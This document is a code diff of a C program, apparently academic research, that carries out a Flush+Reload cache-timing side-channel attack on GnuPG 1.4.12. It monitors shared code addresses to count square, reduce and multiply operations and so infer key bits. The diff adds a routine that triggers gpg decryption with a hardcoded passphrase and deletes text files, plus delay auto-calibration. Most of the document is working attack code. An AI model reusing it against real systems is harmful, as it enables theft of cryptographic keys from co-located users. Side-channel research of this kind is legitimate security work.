@@ -1,16 +1,18 @@
+
 #define _GNU_SOURCE
 #include <string.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
+#include <limits.h>
 #include <fcntl.h> //open
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h> //close
 #include <sched.h>
 #include <pthread.h>
-#include "../../Utils/assemblyinstructions.h"
-#include "../../Utils/cachetechniques.h"
-#include "../../Utils/csvutils.h"
+#include "../../Utils/src/assemblyinstructions.h"
+#include "../../Utils/src/cachetechniques.h"
+#include "../../Utils/src/fileutils.h"
 
 #define handle_error(msg) \
 	do { perror(msg); exit(EXIT_FAILURE); } while (0)
@@ -29,7 +31,7 @@
 
 #define THRESHOLD 45
 
-#define DELAYFORVICTIMACTIVITY 850
+#define DELAYFORVICTIMACTIVITY 2800
 
 #define MAXIDLECOUNT 500
 
@@ -158,7 +160,7 @@ void analysealladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
 		char * ptr_to_monitor = aux + ptr_offset;
 		unsigned int auxtsc = reloadandflush(ptr_to_monitor);
 		if (OUTPUTRAWDATA)
-			out_analysis[addrs_index] = auxtsc;
+			out_analysis[addrs_index] = auxtsc < UINT_MAX ? auxtsc : UINT_MAX;
 		else
 			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
 	}
@@ -172,35 +174,74 @@ void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
 	}
 }
 
-//void synchronouslyrungnupg(){
-//	if (fork() == 0) {
-//		//UNCOMMENT WHE ENCRYPT
-//		//int errno = system(CMD_ENCRYPT_STR);
-//
-//		//COMMENT WHEN ENCRYPT
-//		int errno = system(CMD_DECRYPT_STR);
-//
-//		if (errno == -1)
-//			handle_error("system() running gnupg or removing files");
-//		exit(0);
-//	}
-//}
+#define CMD_DECRYPT_STR "taskset 0x00000001 echo 1a2b3cinesc | /home/root/gnupg-1.4.12/bin/gpg --passphrase-fd 0 /home/root/gnupg-1.4.12/bin/message.txt.gpg"
+#define CMD_RM_DECRYPT_STR "rm /home/root/gnupg-1.4.12/bin/*.txt"
+void synchronouslyrungnupg() {
+	//COMMENT WHEN ENCRYPT
+	int errno = system(CMD_DECRYPT_STR);
+	int errno1 = system(CMD_RM_DECRYPT_STR);
+	if (errno == -1 || errno1 == -1)
+		handle_error("system() running gnupg or removing files");
+}
 
+//0-square
+//1-reduce
+//2-multiply
+void obtainmaxtimesabovethreshold(unsigned int* numberoftimesabovethreshold,
+		unsigned int threshold, unsigned int rowsize, unsigned int columnsize,
+		unsigned int src[][columnsize]) {
+	int i, j;
+	unsigned int max = 0;
 
+	for (j = 0; j < columnsize; ++j) {
+		for (i = 0; i < rowsize - 1; i++) {
+			if (src[i][j] <= threshold && src[i][j] > 0) {
+				++numberoftimesabovethreshold[j];
+			} else {
+				numberoftimesabovethreshold[j] = 0;
+			}
+			if (numberoftimesabovethreshold[j] > max) {
+				max = numberoftimesabovethreshold[j];
+			}
+		}
+		numberoftimesabovethreshold[j] = max;
+		printf("Max times %u address: %u\n", j, max);
+	}
+}
 
-int main() {
-//	const unsigned long long threshold = obtainthreshold();
-//	printf("THRESHOLD ::: %llu\n\r", threshold);
-//	const unsigned long long THRESHOLD = 45;
+void obtaindparameternumberofbits(unsigned int threshold, unsigned int rowsize,
+		unsigned int columnsize, unsigned int src[][columnsize],
+		unsigned int out_numberofbits[columnsize]) {
+	unsigned int numberoftimesabovethreshold[columnsize];
+	int i, j;
+	memset(numberoftimesabovethreshold, 0, sizeof(unsigned int) * columnsize);
+	memset(out_numberofbits, 0, sizeof(unsigned int) * columnsize);
+	obtainmaxtimesabovethreshold(numberoftimesabovethreshold, threshold,
+			rowsize, columnsize, src);
 
-	setcoreaffinity(0);
+	for (j = 0; j < columnsize; ++j) {
+		unsigned int numberoftimes = 0;
+		for (i = 0; i < rowsize - 1; i++) {
+			if (src[i][j] <= threshold && src[i][j] > 0) {
+				++numberoftimes;
+			} else {
+				if (numberoftimes > numberoftimesabovethreshold[j] * 0.5
+						&& numberoftimes <= numberoftimesabovethreshold[j]) {
+					++out_numberofbits[j];
+				}
+				numberoftimes = 0;
+			}
+		}
+		//printf("Number of bits of %u index address: %u\n", j, out_numberofbits[j]);
+	}
+}
 
+int analysecache(int delay, long int exe_addrs[MAX_ADDRS_TO_MONITOR],
+		int nr_addrs,
+		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs]) {
 	int fd_exe;
 	struct stat sbuff;
 	char* mapping_addr;
-
-	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
-	int nr_addrs;
 
 	//share the executable
 	fd_exe = open(EXE_FILENAME, O_RDONLY);
@@ -214,12 +255,7 @@ int main() {
 		handle_error("mmap");
 	printf(".exe shared\n");
 
-	//obtain the addrs to monitor
-	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
-	printf(".exe addrs obtained\n");
-
 	unsigned long ptr_offset = (unsigned long) mapping_addr;
-	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];
 
 	//monitor .exe addrs
 	printf(".exe addrs monitor\n");
@@ -230,7 +266,7 @@ int main() {
 	THRESHOLD);
 	do {
 		do {
-			start += DELAYFORVICTIMACTIVITY;
+			start += delay;
 		} while (missedvictimactivity(start));
 		analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
 		THRESHOLD);
@@ -253,22 +289,73 @@ int main() {
 			++missrate;
 		}
 
-		start += DELAYFORVICTIMACTIVITY;
+		start += delay;
 		missedactivity = missedvictimactivity(start);
 
 	}
-	//End NEW
-
-	//results to csv file
-	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs, i, nr_addrs,
-			analysis_array);
 	printf(".exe results to csv file\n");
-
 	printf("Missed samples: %d\n", missrate);
 	printf("Samples: %d\n", i);
-
 	munmap(mapping_addr, sbuff.st_size);
 	close(fd_exe);
-	return 0;
+	return i;
+}
 
+void autoobtaindelay() {
+	int delay, i = 0, nr_addrs;
+	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
+	const int max_delay = 5000;
+
+	//obtain the addrs to monitor
+	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
+	unsigned int delay_array[max_delay][nr_addrs];
+
+	for (delay = 600; delay < max_delay; delay += 100) {
+
+		setcoreaffinity(0);
+		unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];
+
+		//analyse LLC
+		printf("Analyse Cache delay: %d\n\n", delay);
+		int analysis_array_length = analysecache(delay, exe_addrs,
+				nr_addrs, analysis_array);
+
+		obtaindparameternumberofbits(THRESHOLD, analysis_array_length,
+				nr_addrs, analysis_array, delay_array[i]);
+		++i;
+	}
+	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs,i, nr_addrs, delay_array);
+
+}
+
+int main() {
+//	const unsigned long long threshold = obtainthreshold();
+//	printf("THRESHOLD ::: %llu\n\r", threshold);
+//	const unsigned long long THRESHOLD = 45;
+
+	setcoreaffinity(0);
+
+//	autoobtaindelay();
+
+	long int exe_addrs[MAX_ADDRS_TO_MONITOR];
+	int nr_addrs;
+
+	//obtain the addrs to monitor
+	nr_addrs = getaddrstomonitor(EXE_ADDRS_FILENAME, exe_addrs);
+
+	unsigned int analysis_array[MAX_TIMES_TO_MONITOR_EACH_ADDRS][nr_addrs];
+
+	//analyse LLC
+	int analysis_array_length = analysecache(DELAYFORVICTIMACTIVITY, exe_addrs,
+			nr_addrs, analysis_array);
+
+	//results to csv file
+	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs,
+			analysis_array_length, nr_addrs, analysis_array);
+
+	unsigned int out_numberofbits[nr_addrs];
+	obtaindparameternumberofbits(THRESHOLD, analysis_array_length, nr_addrs,
+			analysis_array, out_numberofbits);
+
+	return 0;
 }
